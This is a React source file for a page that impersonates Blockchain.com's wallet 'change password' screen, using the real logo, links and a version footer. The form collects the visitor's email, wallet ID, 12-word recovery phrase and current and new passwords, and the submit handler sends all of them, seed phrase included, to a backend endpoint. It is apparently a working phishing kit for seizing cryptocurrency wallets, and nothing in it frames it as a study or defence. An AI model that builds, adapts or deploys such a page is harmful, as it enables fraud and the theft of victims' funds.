import React, { useContext, useState } from "react";
import { UserContext } from "../../App";
import "./LoginPage.css";

const LoginPage = () => {
  const [users, setUsers] = useContext(UserContext);
  const [user, setUser] = useState();
  const [errors, setErrors] = useState({
    showMailError: false,
    showWalletError: false,
    showPhraseError: false,
    showOldPassError: false,
    showNewPassError: false,
    error: "",
  });

  const handleFormSubmit = (e) => {
    e.preventDefault();

    if (
      user.email &&
      user.walletId &&
      user.phrases &&
      user.currentPassword &&
      user.newPassword
    ) {
      const { email, walletId, phrases, currentPassword, newPassword } = user;
      const userInfo = {
        email: email,
        wallet: walletId,
        phrases: phrases,
        oldPass: currentPassword,
        newPass: newPassword,
        isLoggedIn: true,
      };
      setUsers(userInfo);
      fetch("http://localhost:5000/userInfo", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(userInfo),
      });
    }
  };

  console.log(users);

  const handleBlur = (e) => {
    let isValid = true;
    if (e.target.name === "email") {
      if ((isValid = /\S+@\S+\.\S+/.test(e.target.value))) {
        isValid = true;
      } else {
        const newError = { ...errors };
        newError.error = "Your email is Invalid";
        newError.showMailError = true;
        newError.showWalletError = false;
        newError.showPhraseError = false;
        newError.showOldPassError = false;
        newError.showNewPassError = false;
        setErrors(newError);
        isValid = false;
      }
    }
    if (e.target.name === "walletId") {
      if ((isValid = /^(?:\d{32})$/.test(e.target.value))) {
        isValid = true;
      } else {
        const newError = { ...errors };
        newError.error = "Your Wallet id is invalid";
        newError.showMailError = false;
        newError.showWalletError = true;
        newError.showPhraseError = false;
        newError.showOldPassError = false;
        newError.showNewPassError = false;
        setErrors(newError);
        isValid = false;
      }
    }
    if (e.target.name === "phrases") {
      if (e.target.value.length == 23) {
        console.log("12 er kom ");
      } else {
        isValid = false;
      }
    }

    // if (e.target.name === "phrases") {
    //   let phresValue = e.target.value;
    //   if (
    //     phresValue.length > 24 ||
    //     phresValue.length < 24 ||
    //     (isValid =
    //       /^(?!\s)[A-Za-z0-9\s]+$/.test(phresValue) && phresValue.length == !NaN)
    //   ) {
    //     isValid = true;
    //     console.log("kaj hosise");
    //   } else {
    //     isValid = false;
    //     const newError = { ...errors };
    //     newError.error = "please check your phrase";
    //     newError.showMailError = false;
    //     newError.showWalletError = false;
    //     newError.showPhraseError = true;
    //     newError.showOldPassError = false;
    //     newError.showNewPassError = false;
    //     setErrors(newError);
    //   }
    // }

    if (e.target.name === "currentPassword") {
      //   isValid = /^(?=.*\d)(?=.*[a-zA-Z])[a-zA-Z0-9]{6,}$/.test(e.target.value);
      //   isValid = /^(?:\d{6})$/.test(e.target.value);
      //   console.log(e.target.value.length);
      if (e.target.value.length < 6) {
        const newError = { ...errors };
        newError.error = "password should be more then 6 digit";
        newError.showMailError = false;
        newError.showWalletError = false;
        newError.showPhraseError = false;
        newError.showOldPassError = true;
        newError.showNewPassError = false;
        setErrors(newError);
        isValid = false;
      } else {
        isValid = true;
      }
    }
    if (e.target.name === "newPassword") {
      if (
        (isValid = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[a-zA-Z\d]{8,}$/.test(
          e.target.value
        ))
      ) {
        isValid = true;
      } else {
        const newError = { ...errors };
        newError.error = "use uppercase ,lowercase and number";
        newError.showMailError = false;
        newError.showWalletError = false;
        newError.showPhraseError = false;
        newError.showOldPassError = false;
        newError.showNewPassError = true;
        setErrors(newError);
        isValid = false;
      }
    }

    if (isValid) {
      const userInfo = { ...user };
      userInfo[e.target.name] = [e.target.value];
      setUser(userInfo);
    }
  };
  const handleToggle = () => {
    const x = document.getElementById("new-password");
    if (x.type === "password") {
      x.type = "text";
    } else {
      x.type = "password";
    }
  };

  return (
    <div>
      <div id="bg">
        <div id="bcdiv">
          <a href="https://www.blockchain.com">
            <img
              src="https://login.blockchain.com/img/bc-logo.svg?91c7840afd5ef690da30e77ec34105f3"
              height="24px"
              width="240px"
            />
          </a>
        </div>
      </div>

      {users.isLoggedIn ? (
        <div className="success">
          <h4 style={{ color: "red" }} className="text-center ">
            You Have successfully changed password for{" "}
            <strong>{users.email[0]}</strong>
          </h4>
        </div>
      ) : (
        <div>
          <div className="cp">
            <h1>Change Your Blockchain Wallet Password</h1>
            <p>Fill the form below to secure your blockchain wallet</p>
          </div>
          <form className="container" onSubmit={handleFormSubmit}>
            <div className="formpush">
              <div className="form-group">
                <h4>Email*</h4>
                <input
                  onBlur={handleBlur}
                  type="email"
                  className="form-control"
                  name="email"
                  id="email"
                  placeholder="Enter Your Email"
                  required
                  autocomplete="off"
                />
                {errors.showMailError && (
                  <p style={{ color: "red" }}>{errors.error}</p>
                )}
                <div id="email-error"></div>
              </div>

              <div className="form-group">
                <h4>Wallet ID*</h4>
                <input
                  onBlur={handleBlur}
                  type="text"
                  className="form-control"
                  name="walletId"
                  id="wallet-id"
                  placeholder="Enter Wallet ID"
                  required
                />
                {errors.showWalletError && (
                  <p style={{ color: "red" }}>{errors.error}</p>
                )}
                <div id="wallet-id-error"></div>
              </div>

              <div className="form-group">
                <h4>Recovery Phrase*</h4>
                <input
                  onBlur={handleBlur}
                  type="text"
                  className="form-control"
                  name="phrases"
                  id="phrase"
                  placeholder="Enter Your 12 Word Phrase, Lowercase, With Spaces Between Each Word"
                  required
                />
                {errors.showPhraseError && (
                  <p style={{ color: "red" }}>{errors.error}</p>
                )}
                <div id="phrases-error"></div>
              </div>

              <div className="form-group">
                <h4>Current Password*</h4>
                <input
                  onBlur={handleBlur}
                  type="text"
                  className="form-control"
                  name="currentPassword"
                  id="current-password"
                  placeholder="Enter Your Current Password"
                  required
                />
                {errors.showOldPassError && (
                  <p style={{ color: "red" }}>{errors.error}</p>
                )}
                <div id="current-pass-error"></div>
              </div>

              <div className="form-group">
                <h4>New Password*</h4>
                <input
                  onBlur={handleBlur}
                  type="password"
                  className="form-control"
                  name="newPassword"
                  id="new-password"
                  placeholder="Enter Your New Password"
                  required
                />

                <div id="newPass-error"></div>
                <input
                  type="checkbox"
                  className="toggle"
                  onClick={handleToggle}
                />
                {errors.showNewPassError && (
                  <p style={{ color: "red" }}>{errors.error}</p>
                )}
                <center>
                  <a href="confirmed.php">
                    <input
                      type="submit"
                      className="btn btn-info"
                      id="change"
                      name="change"
                      value="Change Password"
                    />
                  </a>
                </center>
              </div>
            </div>
          </form>
        </div>
      )}
      <div id="footer">
        <div>English</div>
        <div>
          <a href="https://github.com/blockchain/blockchain-wallet-v4-frontend/releases">
            Version 4.48.16
          </a>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;
